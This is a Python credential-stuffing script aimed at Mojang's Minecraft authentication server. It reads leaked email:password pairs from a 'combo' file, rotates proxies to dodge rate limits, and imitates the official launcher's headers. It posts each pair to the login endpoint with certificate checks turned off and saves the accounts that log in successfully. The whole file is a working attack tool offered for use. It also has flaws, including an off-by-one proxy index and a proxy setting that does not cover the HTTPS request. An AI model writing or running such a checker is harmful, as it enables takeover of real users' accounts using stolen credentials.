import csv
import requests
import random

working = []

headers = {
    'Host': 'authserver.mojang.com',
    'Connection': 'close',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'mojang://launcher',
    'User-Agent': 'Minecraft Launcher/2.1.3674 (fafa322bd0) Windows (10.0; x86_64)',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8',
}

requests.packages.urllib3.disable_warnings()

with open("combo.txt") as f:
	reader = csv.reader(f, delimiter=':')
	email, password = zip(*reader)

with open("proxies.txt") as f:
	reader = csv.reader(f, delimiter=':')
	IP, Port = zip(*reader)

def checkAccount(accountNumber):
    proxyNumber = random.randint(0,len(IP))
    data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}'
    response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + IP[proxyNumber] + ":" + Port[proxyNumber]}, headers=headers, data=data, verify=False)
    if any("accessToken" in s for s in response):
		working.append(email[accountNumber] + ":" + password[accountNumber])
		print(working)
		with open('working.txt', 'w') as f:
			for item in working:
				f.write("%s\n" % item)
    else:
        print("Not working :(")



for i in range(len(email)):
    try:
        checkAccount(i)
    except:
        pass
